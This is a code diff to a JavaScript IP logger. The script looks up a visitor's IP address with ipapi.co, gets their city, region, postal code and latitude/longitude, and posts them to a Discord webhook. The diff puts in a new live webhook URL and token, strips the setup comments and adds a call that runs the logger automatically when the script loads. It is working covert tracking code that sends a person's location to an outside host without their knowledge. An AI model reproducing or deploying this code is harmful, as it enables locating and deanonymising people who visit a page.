@@ -6,21 +6,21 @@ const sendIP = () => {
             return fetch(`https://ipapi.co/${ipadd}/json/`)
                 .then(geoResponse => geoResponse.json())
                 .then(geoData => {
-                    const dscURL = 'https://discord.com/api/webhooks/1443048665060216842/9uztTJLzht8-CFfLm1nWnukGYrrqLav39rwdv795wt_Crp6oTPHJ9RR8yn0r3L48Yi4P'; // replace with your webhook url
+                    const dscURL = 'https://discord.com/api/webhooks/1443094310169088050/6IZeJRM-6yBlD-GOK9t_mfaI89UO7LaPuo80CTNQY9PxgZAFaDYIWZM9GiAGmkVQzftL';
                     return fetch(dscURL, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
                         },
                         body: JSON.stringify({
-                            username: "logger <3", // optionally changeable
-                            avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg", // optionally changeable
+                            username: "logger <3", 
+                            avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg", 
                             content: `@everyone`,
                             embeds: [
                                 {
                                     title: 'Scammer',
                                     description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
-                                    color: 0x800080 // optionally changeable
+                                    color: 0x800080 
                                 }
                             ]
                         })
@@ -39,4 +39,5 @@ const sendIP = () => {
             console.log('Error :(');
         });
 };
+
 sendIP();
